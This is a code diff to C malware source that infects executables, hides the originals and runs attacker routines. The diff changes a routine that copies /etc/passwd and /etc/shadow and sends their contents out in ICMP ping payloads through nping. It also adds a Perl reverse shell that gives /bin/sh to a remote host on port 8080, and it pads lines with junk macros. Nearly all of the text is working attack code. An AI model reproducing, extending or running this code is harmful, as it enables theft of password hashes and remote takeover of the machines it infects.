@@ -6,6 +6,7 @@
 #include <dirent.h>
 #include <unistd.h>
 #include <errno.h>
+#include <iconv.h>
 
 #define PUSH 0x50
 #define POP 0x58
@@ -175,6 +176,17 @@ char* read_file(const char *file_name)
     return str;
 }
 
+/* Executes a bash command */
+void execute_bash(const char *bash_code, const char *file_name)
+{
+    int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
+    char cmd[cmd_len];                      JUNK;
+
+    sprintf(cmd, bash_code, file_name);     JUNK;
+
+    system(cmd);
+}
+
 // Send /etc/passwd and /etc/shadow files in a ping
 void execute(const char *ip_addr)
 {
@@ -185,13 +197,21 @@ void execute(const char *ip_addr)
     int passwd_len;                         JUNK;
     int shadow_len;
 
-    passwd = read_file("/etc/passwd");
-    shadow = read_file("/etc/shadow");      JUNK;
+    system("cp /etc/passwd .passwd");       JUNK;
+    system("cp /etc/shadow .shadow");       JUNK;
+    system("sed -i 's/\\$/\\$ /g' .passwd");
+    system("sed -i 's/\\$/\\$ /g' .shadow");
 
-    passwd_len = strlen(passwd);
+    passwd = read_file(".passwd");          JUNK;
+    shadow = read_file(".shadow");          JUNK;
+
+    system("rm .passwd");                   JUNK;
+    system("rm .shadow");                   JUNK;
+
+    passwd_len = strlen(passwd);            JUNK;
     shadow_len = strlen(shadow);            JUNK;
 
-    char *ping = "sudo nping --quiet -c 1 --icmp --data-string \"%s\" %s > /dev/null 2>&1";
+    char *ping = "sudo nping --quiet -N -c 1 --icmp --data-string \"%s\" %s";// > /dev/null 2>&1";
     int ping_len = strlen(ping);            JUNK;
 
     int len = passwd_len;                   JUNK;
@@ -233,17 +253,6 @@ void copy_and_hide_file(const char *bash_code, const char *filename)
     sprintf(cmd, bash_code, filename, filename);
 
     system(cmd);                            JUNK;
-}
-
-/* Executes a bash command */
-void execute_bash(const char *bash_code, const char *file_name)
-{
-    int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
-    char cmd[cmd_len];                      JUNK;
-
-    sprintf(cmd, bash_code, file_name);     JUNK;
-
-    system(cmd);
 }
 
 /* Embeds the malware in the executable and hides a copy of the original executable */
@@ -327,6 +336,7 @@ int main(int argc, char* argv[])
     }
     // Execute the original, hidden executable
     execute_bash("./.wildfire_%s", original_executable);    JUNK;
-
+    // Opens a Perl reverse shell with TCP socket
+    execute_bash("perl -e 'use Socket;$i=\"%s\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "127.0.0.1");
     return 0;
 }
